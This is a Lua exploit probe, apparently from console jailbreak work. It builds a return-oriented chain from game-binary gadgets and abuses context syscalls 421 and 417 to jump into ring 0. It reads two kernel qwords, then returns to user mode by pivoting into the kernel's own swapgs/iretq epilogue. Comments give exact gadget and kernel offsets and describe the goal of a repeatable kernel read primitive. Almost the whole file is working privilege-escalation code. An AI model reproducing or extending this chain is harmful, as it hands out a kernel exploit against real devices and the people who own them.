-- CRASH_CLASS: RISKY -- ring-0 chain, then a jump into kernel text; a wrong offset panics the console
-- PROBE 1368a: ring-0 kernel read, then the kernel itself does swapgs + iretq
--
-- The chain works (1366a/1367b) but the return does not: the kernel's return path
-- skips `swapgs` when the frame's CS has RPL 0, so userland resumes with GS = the
-- kernel per-CPU base and libkernel's post-`syscall` code dies at si_addr 0x16.
--
-- 13.60's return path (docs/dumps_13.60/kernel_text.bin base+0x257B28) is
--
--     test byte ptr [rsp+0xF0], 3
--     je   +4
--     cli
--     swapgs              <-- base+0x257B33
--     add rsp, 0xE8
--     iretq
--
-- so this chain ends by pivoting into base+0x257B33 with RSP arranged so that the
-- kernel does `swapgs` (GS: kernel -> user, KERNEL_GS_BASE: user -> kernel -- the
-- exact state a normal syscall return leaves), then `add rsp,0xE8`, then its own
-- iretq to CPL3 from a frame we placed at X+0xF0. If 14.10 still has that code at
-- that offset (1367c reads the qword there first) the loader survives the landing
-- and this probe prints both kernel qwords: a repeatable kernel read primitive.
--
-- X = chain+0x200 is the pop rsp target; [X] = base+0x257B33 and the iret frame
-- begins at X+0xF0 (RIP, CS, RFLAGS, RSP, SS).
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1367c_ring0_two_qword_dump_*.txt
--   results/phase35_dead_end_reruns/1367b_ring0_safe_return_20261109_115658.txt
--   results/phase35_dead_end_reruns/1366a_ring0_kernel_read_20261109_115002.txt
--   docs/dumps_13.60/kernel_text.bin (doreti tail at file 0x257b28..0x257b3d)

if _G.__p1368_ran then
    print("[!] RE-ENTRY")
    print("=== PROBE 1368a RE-ENTRY ===")
    return
end
_G.__p1368_ran = true

print("=== PROBE 1368a: RING-0 READ + KERNEL swapgs RETURN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_wd(addr, val)
    return (pcall(function() memory.write_dword(addr, val) end))
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return to_num(v) end
    return nil
end
local function rdq(addr)
    local ok, v = pcall(function() return memory.read_qword(addr) end)
    if not ok or v == nil then return nil end
    return to_num(v)
end
local function wrq(addr, val)
    pcall(function() memory.write_qword(addr, val) end)
end
local function u64v(v) return uint64(string.format("0x%X", v)) end
local function U(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end

local KBASE_HI = 0xFFFFFFFF
local KBASE_LO = 0xC1000000

local sc593 = make_syscall(593)
local sc421 = make_syscall(421)
local sc417 = make_syscall(417)
local sc20 = make_syscall(20)

print(string.format("[0] pid=%d", to_num(sc20(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local EBN = to_num(eb_lo) + to_num(eb_hi) * 4294967296
print(string.format("[0] eboot base=0x%X", EBN))

local S = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(S + off, 0) end
local SA = to_num(S)
local OUT1 = SA + 0x1A0
local OUT2 = SA + 0x1A8
local X    = SA + 0x200
local RFR  = X + 0xF0

local G_POPSI  = EBN + 0xD77D
local G_MOVRD  = EBN + 0x1A5CC4
local G_POPRDI = EBN + 0xC9DFE
local G_MOVWR  = EBN + 0x92C67
local G_POPRSP = EBN + 0x9A2

local i = 0
local function put(g, v) wrq(S + i, u64v(g)); if v then wrq(S + i + 8, v) end; i = i + 0x10 end
put(G_POPSI,  U(KBASE_HI, KBASE_LO))
put(G_MOVRD,  nil)
put(G_POPRDI, u64v(OUT1))
put(G_MOVWR,  nil)
put(G_POPSI,  U(KBASE_HI, KBASE_LO + 0x257B33))
put(G_MOVRD,  nil)
put(G_POPRDI, u64v(OUT2))
put(G_MOVWR,  nil)
put(G_POPRSP, u64v(X))
wrq(S + X - SA, U(KBASE_HI, KBASE_LO + 0x257B33))     -- [X] = kernel swapgs

local F = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(F + off, 0) end
local ok421 = pcall(function() return sc421(uint64(F)) end)
if not ok421 then print("=== PROBE 1368a ABORT (421) ===") return end
local orig_rip    = rdq(F + 0xE0) or 0
local orig_cs     = rdq(F + 0xE8) or 0
local orig_rflags = rdq(F + 0xF0) or 0
local orig_rsp    = rdq(F + 0xF8) or 0
print(string.format("[1] live RIP=0x%X CS=0x%X RFLAGS=0x%X RSP=0x%X", orig_rip, orig_cs, orig_rflags, orig_rsp))
if orig_cs ~= 0x43 then print("=== PROBE 1368a: unexpected CS, ABORT ===") return end

-- frame the kernel's iretq will pop after its own add rsp,0xE8
wrq(S + 0x2F0, u64v(orig_rip))
wrq(S + 0x2F8, u64v(0x43))
wrq(S + 0x300, u64v(orig_rflags))
wrq(S + 0x308, u64v(orig_rsp))
wrq(S + 0x310, u64v(0x3B))

wrq(F + 0xE0, u64v(G_POPRSP))
wrq(F + 0xE8, u64v(0x08))
wrq(F + 0xF8, u64v(SA))

print(string.format("[2] chain=0x%X reads=0x%X%08X,0x%X%08X  swapgs=0x%X%08X  frame=0x%X",
    SA, KBASE_HI, KBASE_LO, KBASE_HI, KBASE_LO + 0x257B33,
    KBASE_HI, KBASE_LO + 0x257B33, RFR))
print("[2] installing frame ...")
local ok417, rv417 = pcall(function() return sc417(u64v(to_num(F))) end)
if ok417 then
    print(string.format("[2] 417 returned %s", tostring(to_num(rv417))))
else
    print("[2] 417 EXC")
end
print("")
print(string.format("[3] OUT1 (kbase+0)        = 0x%X", rdq(S + 0x1A0) or 0))
print(string.format("[3] OUT2 (kbase+0x257B33) = 0x%X", rdq(S + 0x1A8) or 0))
print(string.format("[3] alive pid=%d", to_num(sc20(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))
print("=== PROBE 1368a COMPLETE ===")
